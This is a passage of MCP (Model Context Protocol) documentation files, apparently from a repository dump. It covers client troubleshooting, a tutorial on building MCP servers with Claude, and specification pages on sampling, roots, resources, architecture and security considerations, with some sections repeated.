wrap tool calls in try-catch blocks\n   - Provide meaningful error messages\n   - Gracefully handle connection issues\n\n2. **Resource Management**\n   - Use proper cleanup methods\n   - Close connections when done\n   - Handle server disconnections\n\n3. **Security**\n   - Store API keys securely in `.env`\n   - Validate server responses\n   - Be cautious with tool permissions\n\n### Troubleshooting\n\n#### Server Path Issues\n\n- Double-check the path to your server script\n- Use absolute paths if relative paths aren't working\n- For Windows users, use forward slashes (/) or escaped backslashes (\\\\)\n- Verify the server file has the correct extension (.py or .js)\n\nExample of correct path usage:\n\n```bash\n# Relative path\nnode build/client.js ./server/weather.js\n\n# Absolute path\nnode build/client.js /Users/username/projects/mcp-server/weather.js\n\n# Windows path (either format works)\nnode build/client.js C:/projects/mcp-server/weather.js\nnode build/client.js C:\\\\projects\\\\mcp-server\\\\weather.js\n```\n\n#### Connection Issues\n\n- Verify the server script exists and has correct permissions\n- Check that the server script is executable\n- Ensure the server script's dependencies are installed\n- Try running the server script directly to check for errors\n\n#### Tool Execution Issues\n\n- Check server logs for error messages\n- Verify tool input arguments match the schema\n- Ensure tool dependencies are available\n- Add debug logging to track execution flow\n\n</Tab>\n"}
{"source":"github","repo":"mcp-spec","path":"docs/tutorials/building-mcp-with-llms.mdx","content":"---\ntitle: \"Building MCP with LLMs\"\ndescription: \"Speed up your MCP development using LLMs such as Claude!\"\n---\n\nThis guide will help you use LLMs to help you build custom Model Context Protocol (MCP) servers and clients. We'll be focusing on Claude for this tutorial, but you can do this with any frontier LLM.\n\n## Preparing the documentation\n\nBefore starting, gather the necessary documentation to help Claude understand MCP:\n\n1. Visit https://modelcontextprotocol.io/llms-full.txt and copy the full documentation text\n2. Navigate to either the [MCP TypeScript SDK](https://github.com/modelcontextprotocol/typescript-sdk) or [Python SDK repository](https://github.com/modelcontextprotocol/python-sdk)\n3. Copy the README files and other relevant documentation\n4. Paste these documents into your conversation with Claude\n\n## Describing your server\n\nOnce you've provided the documentation, clearly describe to Claude what kind of server you want to build. Be specific about:\n\n- What resources your server will expose\n- What tools it will provide\n- Any prompts it should offer\n- What external systems it needs to interact with\n\nFor example:\n\n```\nBuild an MCP server that:\n- Connects to my company's PostgreSQL database\n- Exposes table schemas as resources\n- Provides tools for running read-only SQL queries\n- Includes prompts for common data analysis tasks\n```\n\n## Working with Claude\n\nWhen working with Claude on MCP servers:\n\n1. Start with the core functionality first, then iterate to add more features\n2. Ask Claude to explain any parts of the code you don't understand\n3. Request modifications or improvements as needed\n4. Have Claude help you test the server and handle edge cases\n\nClaude can help implement all the key MCP features:\n\n- Resource management and exposure\n- Tool definitions and implementations\n- Prompt templates and handlers\n- Error handling and logging\n- Connection and transport setup\n\n## Best practices\n\nWhen building MCP servers with Claude:\n\n- Break down complex servers into smaller pieces\n- Test each component thoroughly before moving on\n- Keep security in mind - validate inputs and limit access appropriately\n- Document your code well for future maintenance\n- Follow MCP protocol specifications carefully\n\n## Next steps\n\nAfter Claude helps you build your server:\n\n1. Review the generated code carefully\n2. Test the server with the MCP Inspector tool\n3. Connect it to Claude.app or other MCP clients\n4. Iterate based on real usage and feedback\n\nRemember that Claude can help you modify and improve your server as requirements change over time.\n\nNeed more guidance? Just ask Claude specific questions about implementing MCP features or troubleshooting issues that arise.\n"}

A server cannot simply request a\nspecific model by name since the client may not have access to that exact model or may\nprefer to use a different provider's equivalent model.\n\nTo solve this, MCP implements a preference system that combines abstract capability\npriorities with optional model hints:\n\n#### Capability Priorities\n\nServers express their needs through three normalized priority values (0-1):\n\n- `costPriority`: How important is minimizing costs? Higher values prefer cheaper models.\n- `speedPriority`: How important is low latency? Higher values prefer faster models.\n- `intelligencePriority`: How important are advanced capabilities? Higher values prefer\n  more capable models.\n\n#### Model Hints\n\nWhile priorities help select models based on characteristics, `hints` allow servers to\nsuggest specific models or model families:\n\n- Hints are treated as substrings that can match model names flexibly\n- Multiple hints are evaluated in order of preference\n- Clients **MAY** map hints to equivalent models from different providers\n- Hints are advisory&mdash;clients make final model selection\n\nFor example:\n\n```json\n{\n  \"hints\": [\n    { \"name\": \"claude-3-sonnet\" }, // Prefer Sonnet-class models\n    { \"name\": \"claude\" } // Fall back to any Claude model\n  ],\n  \"costPriority\": 0.3, // Cost is less important\n  \"speedPriority\": 0.8, // Speed is very important\n  \"intelligencePriority\": 0.5 // Moderate capability needs\n}\n```\n\nThe client processes these preferences to select an appropriate model from its available\noptions. For instance, if the client doesn't have access to Claude models but has Gemini,\nit might map the sonnet hint to `gemini-1.5-pro` based on similar capabilities.\n\n## Error Handling\n\nClients **SHOULD** return errors for common failure cases:\n\nExample error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"error\": {\n    \"code\": -1,\n    \"message\": \"User rejected sampling request\"\n  }\n}\n```\n\n## Security Considerations\n\n1. Clients **SHOULD** implement user approval controls\n2. Both parties **SHOULD** validate message content\n3. Clients **SHOULD** respect model preference hints\n4. Clients **SHOULD** implement rate limiting\n5. Both parties **MUST** handle sensitive data appropriately\n"}

Roots define the boundaries of where servers can operate\nwithin the filesystem, allowing them to understand which directories and files they have\naccess to. Servers can request the list of roots from supporting clients and receive\nnotifications when that list changes.\n\n## User Interaction Model\n\nRoots in MCP are typically exposed through workspace or project configuration interfaces.\n\nFor example, implementations could offer a workspace/project picker that allows users to\nselect directories and files the server should have access to. This can be combined with\nautomatic workspace detection from version control systems or project files.\n\nHowever, implementations are free to expose roots through any interface pattern that\nsuits their needs&mdash;the protocol itself does not mandate any specific user\ninteraction model.\n\n## Capabilities\n\nClients that support roots **MUST** declare the `roots` capability during\n[initialization](/specification/2024-11-05/basic/lifecycle#initialization):\n\n```json\n{\n  \"capabilities\": {\n    \"roots\": {\n      \"listChanged\": true\n    }\n  }\n}\n```\n\n`listChanged` indicates whether the client will emit notifications when the list of roots\nchanges.\n\n## Protocol Messages\n\n### Listing Roots\n\nTo retrieve roots, servers send a `roots/list` request:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"roots/list\"\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"roots\": [\n      {\n        \"uri\": \"file:///home/user/projects/myproject\",\n        \"name\": \"My Project\"\n      }\n    ]\n  }\n}\n```\n\n### Root List Changes\n\nWhen roots change, clients that support `listChanged` **MUST** send a notification:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/roots/list_changed\"\n}\n```\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Server\n    participant Client\n\n    Note over Server,Client: Discovery\n    Server->>Client: roots/list\n    Client-->>Server: Available roots\n\n    Note over Server,Client: Changes\n    Client--)Server: notifications/roots/list_changed\n    Server->>Client: roots/list\n    Client-->>Server: Updated roots\n```\n\n## Data Types\n\n### Root\n\nA root definition includes:\n\n- `uri`: Unique identifier for the root. This **MUST** be a `file://` URI in the current\n  specification.\n- `name`: Optional human-readable name for display purposes.\n\nExample roots for different use cases:\n\n#### Project Directory\n\n```json\n{\n  \"uri\": \"file:///home/user/projects/myproject\",\n  \"name\": \"My Project\"\n}\n```\n\n#### Multiple Repositories\n\n```json\n[\n  {\n    \"uri\": \"file:///home/user/repos/frontend\",\n    \"name\": \"Frontend Repository\"\n  },\n  {\n    \"uri\": \"file:///home/user/repos/backend\",\n    \"name\": \"Backend Repository\"\n  }\n]\n```\n\n## Error Handling\n\nClients **SHOULD** return standard JSON-RPC errors for common failure cases:\n\n- Client does not support roots: `-32601` (Method not found)\n- Internal errors: `-32603`\n\nExample error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"error\": {\n    \"code\": -32601,\n    \"message\": \"Roots not supported\",\n    \"data\": {\n      \"reason\": \"Client does not have roots capability\"\n    }\n  }\n}\n```\n\n## Security Considerations\n\n1. Clients **MUST**:\n   - Only expose roots with appropriate permissions\n   - Validate all root URIs to prevent path traversal\n   - Implement proper access controls\n   - Monitor root accessibility\n\n2. Servers **SHOULD**:\n   - Handle cases where roots become unavailable\n   - Respect root boundaries during operations\n   - Validate all paths against provided roots\n\n## Implementation Guidelines\n\n1.

Servers **MUST** validate the `Origin` header on all incoming connections to prevent DNS rebinding attacks\n2. When running locally, servers **SHOULD** bind only to localhost (127.0.0.1) rather than all network interfaces (0.0.0.0)\n3. Servers **SHOULD** implement proper authentication for all connections\n\nWithout these protections, attackers could use DNS rebinding to interact with local MCP servers from remote websites.\n\nThe server **MUST** provide two endpoints:\n\n1.

This architecture enables users to integrate AI\ncapabilities across applications while maintaining clear security boundaries and\nisolating concerns. Built on JSON-RPC, MCP provides a stateful session protocol focused\non context exchange and sampling coordination between clients and servers.\n\n## Core Components\n\n```mermaid\ngraph LR\n    subgraph \"Application Host Process\"\n        H[Host]\n        C1[Client 1]\n        C2[Client 2]\n        C3[Client 3]\n        H --> C1\n        H --> C2\n        H --> C3\n    end\n\n    subgraph \"Local machine\"\n        S1[Server 1<br>Files & Git]\n        S2[Server 2<br>Database]\n        R1[(\"Local<br>Resource A\")]\n        R2[(\"Local<br>Resource B\")]\n\n        C1 --> S1\n        C2 --> S2\n        S1 <--> R1\n        S2 <--> R2\n    end\n\n    subgraph \"Internet\"\n        S3[Server 3<br>External APIs]\n        R3[(\"Remote<br>Resource C\")]\n\n        C3 --> S3\n        S3 <--> R3\n    end\n```\n\n### Host\n\nThe host process acts as the container and coordinator:\n\n- Creates and manages multiple client instances\n- Controls client connection permissions and lifecycle\n- Enforces security policies and consent requirements\n- Handles user authorization decisions\n- Coordinates AI/LLM integration and sampling\n- Manages context aggregation across clients\n\n### Clients\n\nEach client is created by the host and maintains an isolated server connection:\n\n- Establishes one stateful session per server\n- Handles protocol negotiation and capability exchange\n- Routes protocol messages bidirectionally\n- Manages subscriptions and notifications\n- Maintains security boundaries between servers\n\nA host application creates and manages multiple clients, with each client having a 1:1\nrelationship with a particular server.\n\n### Servers\n\nServers provide specialized context and capabilities:\n\n- Expose resources, tools and prompts via MCP primitives\n- Operate independently with focused responsibilities\n- Request sampling through client interfaces\n- Must respect security constraints\n- Can be local processes or remote services\n\n## Design Principles\n\nMCP is built on several key design principles that inform its architecture and\nimplementation:\n\n1. **Servers should be extremely easy to build**\n   - Host applications handle complex orchestration responsibilities\n   - Servers focus on specific, well-defined capabilities\n   - Simple interfaces minimize implementation overhead\n   - Clear separation enables maintainable code\n\n2. **Servers should be highly composable**\n   - Each server provides focused functionality in isolation\n   - Multiple servers can be combined seamlessly\n   - Shared protocol enables interoperability\n   - Modular design supports extensibility\n\n3. **Servers should not be able to read the whole conversation, nor \"see into\" other\n   servers**\n   - Servers receive only necessary contextual information\n   - Full conversation history stays with the host\n   - Each server connection maintains isolation\n   - Cross-server interactions are controlled by the host\n   - Host process enforces security boundaries\n\n4. **Features can be added to servers and clients progressively**\n   - Core protocol provides minimal required functionality\n   - Additional capabilities can be negotiated as needed\n   - Servers and clients evolve independently\n   - Protocol designed for future extensibility\n   - Backwards compatibility is maintained\n\n## Message Types\n\nMCP defines three core message types based on\n[JSON-RPC 2.0](https://www.jsonrpc.org/specification):\n\n- **Requests**: Bidirectional messages with method and parameters expecting a response\n- **Responses**: Successful results or errors matching specific request IDs\n- **Notifications**: One-way messages requiring no response\n\nEach message type follows the JSON-RPC 2.0 specification for structure and delivery\nsemantics.\n\n## Capability Negotiation\n\nThe Model Context Protocol uses a capability-based negotiation system where clients and\nservers explicitly declare their supported features during initialization. Capabilities\ndetermine which protocol features and primitives are available during a session.\n\n- Servers declare capabilities like resource subscriptions, tool support, and prompt\n  templates\n- Clients declare capabilities like sampling support and notification handling\n- Both parties must respect declared capabilities throughout the session\n- Additional capabilities can be negotiated through extensions to the protocol\n\n```mermaid\nsequenceDiagram\n    participant Host\n    participant Client\n    participant Server\n\n    Host->>+Client: Initialize client\n    Client->>+Server: Initialize session with capabilities\n    Server-->>Client: Respond with supported capabilities\n\n    Note over Host,Server: Active Session with Negotiated Features\n\n    loop Client Requests\n        Host->>Client: User- or model-initiated action\n        Client->>Server: Request (tools/resources)\n        Server-->>Client: Response\n        Client-->>Host: Update UI or respond to model\n    end\n\n    loop Server Requests\n        Server->>Client: Request (sampling)\n        Client->>Host: Forward to AI\n        Host-->>Client: AI response\n        Client-->>Server: Response\n    end\n\n    loop Notifications\n        Server--)Client: Resource updates\n        Client--)Server: Status changes\n    end\n\n    Host->>Client: Terminate\n    Client->>-Server: End session\n    deactivate Server\n```\n\nEach capability unlocks specific protocol features for use during the session. For\nexample:\n\n- Implemented [server features](/specification/2024-11-05/server) must be\n  advertised in the server's capabilities\n- Emitting resource subscription notifications requires the server to declare\n  subscription support\n- Tool invocation requires the server to declare tool capabilities\n- [Sampling](/specification/2024-11-05/client) requires the client to\n  declare support in its capabilities\n\nThis capability negotiation ensures clients and servers have a clear understanding of\nsupported functionality while maintaining protocol extensibility.\n"}

Resources allow servers to share data that provides context to\nlanguage models, such as files, database schemas, or application-specific information.\nEach resource is uniquely identified by a\n[URI](https://datatracker.ietf.org/doc/html/rfc3986).\n\n## User Interaction Model\n\nResources in MCP are designed to be **application-driven**, with host applications\ndetermining how to incorporate context based on their needs.\n\nFor example, applications could:\n\n- Expose resources through UI elements for explicit selection, in a tree or list view\n- Allow the user to search through and filter available resources\n- Implement automatic context inclusion, based on heuristics or the AI model's selection\n\n![Example of resource context picker](/specification/2024-11-05/server/resource-picker.png)\n\nHowever, implementations are free to expose resources through any interface pattern that\nsuits their needs&mdash;the protocol itself does not mandate any specific user\ninteraction model.\n\n## Capabilities\n\nServers that support resources **MUST** declare the `resources` capability:\n\n```json\n{\n  \"capabilities\": {\n    \"resources\": {\n      \"subscribe\": true,\n      \"listChanged\": true\n    }\n  }\n}\n```\n\nThe capability supports two optional features:\n\n- `subscribe`: whether the client can subscribe to be notified of changes to individual\n  resources.\n- `listChanged`: whether the server will emit notifications when the list of available\n  resources changes.\n\nBoth `subscribe` and `listChanged` are optional&mdash;servers can support neither,\neither, or both:\n\n```json\n{\n  \"capabilities\": {\n    \"resources\": {} // Neither feature supported\n  }\n}\n```\n\n```json\n{\n  \"capabilities\": {\n    \"resources\": {\n      \"subscribe\": true // Only subscriptions supported\n    }\n  }\n}\n```\n\n```json\n{\n  \"capabilities\": {\n    \"resources\": {\n      \"listChanged\": true // Only list change notifications supported\n    }\n  }\n}\n```\n\n## Protocol Messages\n\n### Listing Resources\n\nTo discover available resources, clients send a `resources/list` request. This operation\nsupports\n[pagination](/specification/2024-11-05/server/utilities/pagination).\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"resources/list\",\n  \"params\": {\n    \"cursor\": \"optional-cursor-value\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"resources\": [\n      {\n        \"uri\": \"file:///project/src/main.rs\",\n        \"name\": \"main.rs\",\n        \"description\": \"Primary application entry point\",\n        \"mimeType\": \"text/x-rust\"\n      }\n    ],\n    \"nextCursor\": \"next-page-cursor\"\n  }\n}\n```\n\n### Reading Resources\n\nTo retrieve resource contents, clients send a `resources/read` request:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"method\": \"resources/read\",\n  \"params\": {\n    \"uri\": \"file:///project/src/main.rs\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"contents\": [\n      {\n        \"uri\": \"file:///project/src/main.rs\",\n        \"mimeType\": \"text/x-rust\",\n        \"text\": \"fn main() {\\n    println!(\\\"Hello world!\\\");\\n}\"\n      }\n    ]\n  }\n}\n```\n\n### Resource Templates\n\nResource templates allow servers to expose parameterized resources using\n[URI templates](https://datatracker.ietf.org/doc/html/rfc6570). Arguments may be\nauto-completed through [the completion API](/specification/2024-11-05/server/utilities/completion).\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"method\": \"resources/templates/list\"\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"result\": {\n    \"resourceTemplates\": [\n      {\n        \"uriTemplate\": \"file:///{path}\",\n        \"name\": \"Project Files\",\n        \"description\": \"Access files in the project directory\",\n        \"mimeType\": \"application/octet-stream\"\n      }\n    ]\n  }\n}\n```\n\n### List Changed Notification\n\nWhen the list of available resources changes, servers that declared the `listChanged`\ncapability **SHOULD** send a notification:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/resources/list_changed\"\n}\n```\n\n### Subscriptions\n\nThe protocol supports optional subscriptions to resource changes. Clients can subscribe\nto specific resources and receive notifications when they change:\n\n**Subscribe Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"method\": \"resources/subscribe\",\n  \"params\": {\n    \"uri\": \"file:///project/src/main.rs\"\n  }\n}\n```\n\n**Update Notification:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/resources/updated\",\n  \"params\": {\n    \"uri\": \"file:///project/src/main.rs\"\n  }\n}\n```\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    Note over Client,Server: Resource Discovery\n    Client->>Server: resources/list\n    Server-->>Client: List of resources\n\n    Note over Client,Server: Resource Access\n    Client->>Server: resources/read\n    Server-->>Client: Resource contents\n\n    Note over Client,Server: Subscriptions\n    Client->>Server: resources/subscribe\n    Server-->>Client: Subscription confirmed\n\n    Note over Client,Server: Updates\n    Server--)Client: notifications/resources/updated\n    Client->>Server: resources/read\n    Server-->>Client: Updated contents\n```\n\n## Data Types\n\n### Resource\n\nA resource definition includes:\n\n- `uri`: Unique identifier for the resource\n- `name`: Human-readable name\n- `description`: Optional description\n- `mimeType`: Optional MIME type\n\n### Resource Contents\n\nResources can contain either text or binary data:\n\n#### Text Content\n\n```json\n{\n  \"uri\": \"file:///example.txt\",\n  \"mimeType\": \"text/plain\",\n  \"text\": \"Resource content\"\n}\n```\n\n#### Binary Content\n\n```json\n{\n  \"uri\": \"file:///example.png\",\n  \"mimeType\": \"image/png\",\n  \"blob\": \"base64-encoded-data\"\n}\n```\n\n## Common URI Schemes\n\nThe protocol defines several standard URI schemes. This list not\nexhaustive&mdash;implementations are always free to use additional, custom URI schemes.\n\n### https://\n\nUsed to represent a resource available on the web.\n\nServers **SHOULD** use this scheme only when the client is able to fetch and load the\nresource directly from the web on its own—that is, it doesn’t need to read the resource\nvia the MCP server.\n\nFor other use cases, servers **SHOULD** prefer to use another URI scheme, or define a\ncustom one, even if the server will itself be downloading resource contents over the\ninternet.\n\n### file://\n\nUsed to identify resources that behave like a filesystem. However, the resources do not\nneed to map to an actual physical filesystem.\n\nMCP servers **MAY** identify file:// resources with an\n[XDG MIME type](https://specifications.freedesktop.org/shared-mime-info-spec/0.14/ar01s02.html#id-1.3.14),\nlike `inode/directory`, to represent non-regular files (such as directories) that don’t\notherwise have a standard MIME type.\n\n### git://\n\nGit version control integration.\n\n## Error Handling\n\nServers **SHOULD** return standard JSON-RPC errors for common failure cases:\n\n- Resource not found: `-32002`\n- Internal errors: `-32603`\n\nExample error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 5,\n  \"error\": {\n    \"code\": -32002,\n    \"message\": \"Resource not found\",\n    \"data\": {\n      \"uri\": \"file:///nonexistent.txt\"\n    }\n  }\n}\n```\n\n## Security Considerations\n\n1. Servers **MUST** validate all resource URIs\n2. Access controls **SHOULD** be implemented for sensitive resources\n3. Binary data **MUST** be properly encoded\n4. Resource permissions **SHOULD** be checked before operations\n"}

In a similar way, MCP standardizes how to integrate additional context\nand tools into the ecosystem of AI applications.\n\n## Key Details\n\n### Base Protocol\n\n- [JSON-RPC](https://www.jsonrpc.org/) message format\n- Stateful connections\n- Server and client capability negotiation\n\n### Features\n\nServers offer any of the following features to clients:\n\n- **Resources**: Context and data, for the user or the AI model to use\n- **Prompts**: Templated messages and workflows for users\n- **Tools**: Functions for the AI model to execute\n\nClients may offer the following feature to servers:\n\n- **Sampling**: Server-initiated agentic behaviors and recursive LLM interactions\n\n### Additional Utilities\n\n- Configuration\n- Progress tracking\n- Cancellation\n- Error reporting\n- Logging\n\n## Security and Trust & Safety\n\nThe Model Context Protocol enables powerful capabilities through arbitrary data access\nand code execution paths. With this power comes important security and trust\nconsiderations that all implementors must carefully address.\n\n### Key Principles\n\n1. **User Consent and Control**\n   - Users must explicitly consent to and understand all data access and operations\n   - Users must retain control over what data is shared and what actions are taken\n   - Implementors should provide clear UIs for reviewing and authorizing activities\n\n2. **Data Privacy**\n   - Hosts must obtain explicit user consent before exposing user data to servers\n   - Hosts must not transmit resource data elsewhere without user consent\n   - User data should be protected with appropriate access controls\n\n3. **Tool Safety**\n   - Tools represent arbitrary code execution and must be treated with appropriate\n     caution\n   - Hosts must obtain explicit user consent before invoking any tool\n   - Users should understand what each tool does before authorizing its use\n\n4. **LLM Sampling Controls**\n   - Users must explicitly approve any LLM sampling requests\n   - Users should control:\n     - Whether sampling occurs at all\n     - The actual prompt that will be sent\n     - What results the server can see\n   - The protocol intentionally limits server visibility into prompts\n\n### Implementation Guidelines\n\nWhile MCP itself cannot enforce these security principles at the protocol level,\nimplementors **SHOULD**:\n\n1. Build robust consent and authorization flows into their applications\n2. Provide clear documentation of security implications\n3. Implement appropriate access controls and data protections\n4. Follow security best practices in their integrations\n5.

This flow\nallows clients to maintain control over model access, selection, and permissions while\nenabling servers to leverage AI capabilities&mdash;with no server API keys necessary.\nServers can request text, audio, or image-based interactions and optionally include\ncontext from MCP servers in their prompts.\n\n## User Interaction Model\n\nSampling in MCP allows servers to implement agentic behaviors, by enabling LLM calls to\noccur _nested_ inside other MCP server features.\n\nImplementations are free to expose sampling through any interface pattern that suits\ntheir needs&mdash;the protocol itself does not mandate any specific user interaction\nmodel.\n\n<Warning>\n\nFor trust & safety and security, there **SHOULD** always\nbe a human in the loop with the ability to deny sampling requests.\n\nApplications **SHOULD**:\n\n- Provide UI that makes it easy and intuitive to review sampling requests\n- Allow users to view and edit prompts before sending\n- Present generated responses for review before delivery\n\n</Warning>\n\n## Capabilities\n\nClients that support sampling **MUST** declare the `sampling` capability during\n[initialization](/specification/2025-03-26/basic/lifecycle#initialization):\n\n```json\n{\n  \"capabilities\": {\n    \"sampling\": {}\n  }\n}\n```\n\n## Protocol Messages\n\n### Creating Messages\n\nTo request a language model generation, servers send a `sampling/createMessage` request:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"sampling/createMessage\",\n  \"params\": {\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": {\n          \"type\": \"text\",\n          \"text\": \"What is the capital of France?\"\n        }\n      }\n    ],\n    \"modelPreferences\": {\n      \"hints\": [\n        {\n          \"name\": \"claude-3-sonnet\"\n        }\n      ],\n      \"intelligencePriority\": 0.8,\n      \"speedPriority\": 0.5\n    },\n    \"systemPrompt\": \"You are a helpful assistant.\",\n    \"maxTokens\": 100\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"role\": \"assistant\",\n    \"content\": {\n      \"type\": \"text\",\n      \"text\": \"The capital of France is Paris.\"\n    },\n    \"model\": \"claude-3-sonnet-20240307\",\n    \"stopReason\": \"endTurn\"\n  }\n}\n```\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Server\n    participant Client\n    participant User\n    participant LLM\n\n    Note over Server,Client: Server initiates sampling\n    Server->>Client: sampling/createMessage\n\n    Note over Client,User: Human-in-the-loop review\n    Client->>User: Present request for approval\n    User-->>Client: Review and approve/modify\n\n    Note over Client,LLM: Model interaction\n    Client->>LLM: Forward approved request\n    LLM-->>Client: Return generation\n\n    Note over Client,User: Response review\n    Client->>User: Present response for approval\n    User-->>Client: Review and approve/modify\n\n    Note over Server,Client: Complete request\n    Client-->>Server: Return approved response\n```\n\n## Data Types\n\n### Messages\n\nSampling messages can contain:\n\n#### Text Content\n\n```json\n{\n  \"type\": \"text\",\n  \"text\": \"The message content\"\n}\n```\n\n#### Image Content\n\n```json\n{\n  \"type\": \"image\",\n  \"data\": \"base64-encoded-image-data\",\n  \"mimeType\": \"image/jpeg\"\n}\n```\n\n#### Audio Content\n\n```json\n{\n  \"type\": \"audio\",\n  \"data\": \"base64-encoded-audio-data\",\n  \"mimeType\": \"audio/wav\"\n}\n```\n\n### Model Preferences\n\nModel selection in MCP requires careful abstraction since servers and clients may use\ndifferent AI providers with distinct model offerings. A server cannot simply request a\nspecific model by name since the client may not have access to that exact model or may\nprefer to use a different provider's equivalent model.\n\nTo solve this, MCP implements a preference system that combines abstract capability\npriorities with optional model hints:\n\n#### Capability Priorities\n\nServers express their needs through three normalized priority values (0-1):\n\n- `costPriority`: How important is minimizing costs? Higher values prefer cheaper models.\n- `speedPriority`: How important is low latency? Higher values prefer faster models.\n- `intelligencePriority`: How important are advanced capabilities? Higher values prefer\n  more capable models.\n\n#### Model Hints\n\nWhile priorities help select models based on characteristics, `hints` allow servers to\nsuggest specific models or model families:\n\n- Hints are treated as substrings that can match model names flexibly\n- Multiple hints are evaluated in order of preference\n- Clients **MAY** map hints to equivalent models from different providers\n- Hints are advisory&mdash;clients make final model selection\n\nFor example:\n\n```json\n{\n  \"hints\": [\n    { \"name\": \"claude-3-sonnet\" }, // Prefer Sonnet-class models\n    { \"name\": \"claude\" } // Fall back to any Claude model\n  ],\n  \"costPriority\": 0.3, // Cost is less important\n  \"speedPriority\": 0.8, // Speed is very important\n  \"intelligencePriority\": 0.5 // Moderate capability needs\n}\n```\n\nThe client processes these preferences to select an appropriate model from its available\noptions. For instance, if the client doesn't have access to Claude models but has Gemini,\nit might map the sonnet hint to `gemini-1.5-pro` based on similar capabilities.\n\n## Error Handling\n\nClients **SHOULD** return errors for common failure cases:\n\nExample error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"error\": {\n    \"code\": -1,\n    \"message\": \"User rejected sampling request\"\n  }\n}\n```\n\n## Security Considerations\n\n1. Clients **SHOULD** implement user approval controls\n2. Both parties **SHOULD** validate message content\n3. Clients **SHOULD** respect model preference hints\n4. Clients **SHOULD** implement rate limiting\n5. Both parties **MUST** handle sensitive data appropriately\n"}

Roots define the boundaries of where servers can operate\nwithin the filesystem, allowing them to understand which directories and files they have\naccess to. Servers can request the list of roots from supporting clients and receive\nnotifications when that list changes.\n\n## User Interaction Model\n\nRoots in MCP are typically exposed through workspace or project configuration interfaces.\n\nFor example, implementations could offer a workspace/project picker that allows users to\nselect directories and files the server should have access to. This can be combined with\nautomatic workspace detection from version control systems or project files.\n\nHowever, implementations are free to expose roots through any interface pattern that\nsuits their needs&mdash;the protocol itself does not mandate any specific user\ninteraction model.\n\n## Capabilities\n\nClients that support roots **MUST** declare the `roots` capability during\n[initialization](/specification/2025-03-26/basic/lifecycle#initialization):\n\n```json\n{\n  \"capabilities\": {\n    \"roots\": {\n      \"listChanged\": true\n    }\n  }\n}\n```\n\n`listChanged` indicates whether the client will emit notifications when the list of roots\nchanges.\n\n## Protocol Messages\n\n### Listing Roots\n\nTo retrieve roots, servers send a `roots/list` request:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"roots/list\"\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"roots\": [\n      {\n        \"uri\": \"file:///home/user/projects/myproject\",\n        \"name\": \"My Project\"\n      }\n    ]\n  }\n}\n```\n\n### Root List Changes\n\nWhen roots change, clients that support `listChanged` **MUST** send a notification:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/roots/list_changed\"\n}\n```\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Server\n    participant Client\n\n    Note over Server,Client: Discovery\n    Server->>Client: roots/list\n    Client-->>Server: Available roots\n\n    Note over Server,Client: Changes\n    Client--)Server: notifications/roots/list_changed\n    Server->>Client: roots/list\n    Client-->>Server: Updated roots\n```\n\n## Data Types\n\n### Root\n\nA root definition includes:\n\n- `uri`: Unique identifier for the root. This **MUST** be a `file://` URI in the current\n  specification.\n- `name`: Optional human-readable name for display purposes.\n\nExample roots for different use cases:\n\n#### Project Directory\n\n```json\n{\n  \"uri\": \"file:///home/user/projects/myproject\",\n  \"name\": \"My Project\"\n}\n```\n\n#### Multiple Repositories\n\n```json\n[\n  {\n    \"uri\": \"file:///home/user/repos/frontend\",\n    \"name\": \"Frontend Repository\"\n  },\n  {\n    \"uri\": \"file:///home/user/repos/backend\",\n    \"name\": \"Backend Repository\"\n  }\n]\n```\n\n## Error Handling\n\nClients **SHOULD** return standard JSON-RPC errors for common failure cases:\n\n- Client does not support roots: `-32601` (Method not found)\n- Internal errors: `-32603`\n\nExample error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"error\": {\n    \"code\": -32601,\n    \"message\": \"Roots not supported\",\n    \"data\": {\n      \"reason\": \"Client does not have roots capability\"\n    }\n  }\n}\n```\n\n## Security Considerations\n\n1. Clients **MUST**:\n   - Only expose roots with appropriate permissions\n   - Validate all root URIs to prevent path traversal\n   - Implement proper access controls\n   - Monitor root accessibility\n\n2. Servers **SHOULD**:\n   - Handle cases where roots become unavailable\n   - Respect root boundaries during operations\n   - Validate all 